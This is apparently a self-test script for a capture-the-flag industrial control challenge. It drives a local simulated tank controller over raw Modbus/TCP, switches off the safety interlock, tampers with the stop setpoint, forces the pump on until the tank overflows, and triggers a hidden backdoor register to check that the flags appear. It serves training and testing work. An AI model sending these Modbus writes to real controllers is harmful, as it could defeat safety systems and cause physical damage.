#!/usr/bin/env python3
"""的サーバの自己テスト: 攻撃→フラグ出現→Modbusで読み出して検証.

標準ライブラリのみ。target.py を別プロセスで起動し、生の Modbus/TCP で叩く。
"""
import socket, struct, subprocess, sys, time, os

HOST, PORT = "127.0.0.1", 5099
HERE = os.path.dirname(os.path.abspath(__file__))

class MB:
    def __init__(s, host, port):
        s.tid = 0; s.sock = socket.create_connection((host, port), timeout=3)
    def _txn(s, pdu):
        s.tid = (s.tid + 1) & 0xFFFF
        adu = struct.pack(">HHHB", s.tid, 0, len(pdu) + 1, 1) + pdu
        s.sock.sendall(adu)
        head = s._recv(7); _, _, ln = struct.unpack(">HHH", head[:6])
        return s._recv(ln - 1)
    def _recv(s, n):
        b = b""
        while len(b) < n:
            c = s.sock.recv(n - len(b));
            if not c: raise ConnectionError
            b += c
        return b
    def read_holding(s, addr, qty):
        r = s._txn(struct.pack(">BHH", 3, addr, qty))
        if r[0] & 0x80: raise RuntimeError(f"exc {r[1]}")
        n = r[1]; return list(struct.unpack(">" + "H"*(n//2), r[2:2+n]))
    def read_coils(s, addr, qty):
        r = s._txn(struct.pack(">BHH", 1, addr, qty))
        if r[0] & 0x80: raise RuntimeError(f"exc {r[1]}")
        byte = r[2]; return [bool(byte >> i & 1) for i in range(qty)]
    def write_coil(s, addr, on):
        return s._txn(struct.pack(">BHH", 5, addr, 0xFF00 if on else 0))
    def write_register(s, addr, val):
        return s._txn(struct.pack(">BHH", 6, addr, val & 0xFFFF))
    def close(s): s.sock.close()

def regs_to_ascii(vals):
    b = bytearray()
    for v in vals:
        b.append(v >> 8); b.append(v & 0xFF)
    return b.split(b"\x00")[0].decode("ascii", "replace")

def main():
    proc = subprocess.Popen([sys.executable, os.path.join(HERE, "target.py"),
                             "--host", HOST, "--port", str(PORT), "--interval", "0.02"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ok = True
    try:
        time.sleep(0.6)
        c = MB(HOST, PORT)
        # --- recon: 水位レジスタ(10)が時間変化することを確認 ---
        a = c.read_holding(10, 1)[0]; time.sleep(0.2); b = c.read_holding(10, 1)[0]
        print(f"[recon] HR10 (水位) {a/10:.1f}% → {b/10:.1f}% : {'変化あり' if a!=b else '変化なし'}")

        # --- フラグは達成前は 0 ---
        pre = c.read_holding(160, 20)
        assert all(v == 0 for v in pre), "達成前に overflow フラグが出ている"
        print("[pre ] overflow フラグ領域(160+): すべて0（未達成）OK")

        # --- 攻撃: 安全IL無効化 + 停止SP改ざん ---
        c.write_coil(6, False)          # CO_SAFETY off
        c.write_register(11, 0xFFFF)    # HR_SETPOINT_HI 到達不能
        c.write_coil(5, True)           # CO_PUMP 強制ON
        print("[atk ] 安全IL無効化 / 停止SP=0xFFFF / ポンプON を送信")

        # --- 中間フラグを読み出して検証 ---
        for name, base, want in [("pump",100,"FLAG{pump_is_mine_coil_write}"),
                                 ("setpoint",120,"FLAG{setpoint_tamper_no_stop}"),
                                 ("safety",140,"FLAG{safety_interlock_bypassed}")]:
            got = regs_to_ascii(c.read_holding(base, 20))
            status = "OK" if got == want else f"NG(得:{got!r})"
            ok &= got == want
            print(f"[flag] {name:9s} @ {base}: {got}  {status}")

        # --- 溢水まで待ち、優勝フラグを読む ---
        win = ""; t0 = time.time()
        while time.time() - t0 < 8:
            over = c.read_coils(7, 1)[0]
            if over:
                win = regs_to_ascii(c.read_holding(160, 30)); break
            time.sleep(0.1)
        exp = "FLAG{OVERFLOW__you_flooded_the_tank}"
        status = "OK" if win == exp else f"NG(得:{win!r})"
        ok &= win == exp
        lvl = c.read_holding(10,1)[0]/10
        print(f"[WIN ] 溢水={c.read_coils(7,1)[0]} 水位={lvl:.1f}% 優勝フラグ: {win}  {status}")

        # --- ボーナス: 手がかり(70番台)を読み→魔法値を書く→バックドアフラグ ---
        crumb = regs_to_ascii(c.read_holding(70, 12))
        print(f"[bonus] 手がかり@70: {crumb!r}")
        ok &= "4919" in crumb and "51" in crumb
        c.write_register(51, 4919)
        bd = regs_to_ascii(c.read_holding(200, 20))
        exp_bd = "FLAG{hidden_maintenance_backdoor}"
        status = "OK" if bd == exp_bd else f"NG(得:{bd!r})"
        ok &= bd == exp_bd
        print(f"[bonus] バックドアフラグ: {bd}  {status}")

        # --- 例外応答(不正アドレス) ---
        try:
            c.read_holding(9999, 1); print("[exc ] NG: 例外が返らない"); ok = False
        except RuntimeError as e:
            print(f"[exc ] 不正アドレス → 例外応答 {e} OK")
        c.close()
    finally:
        proc.terminate()
    print("\n==== 自己テスト:", "PASS ====" if ok else "FAIL ====")
    sys.exit(0 if ok else 1)

if __name__ == "__main__":
    main()
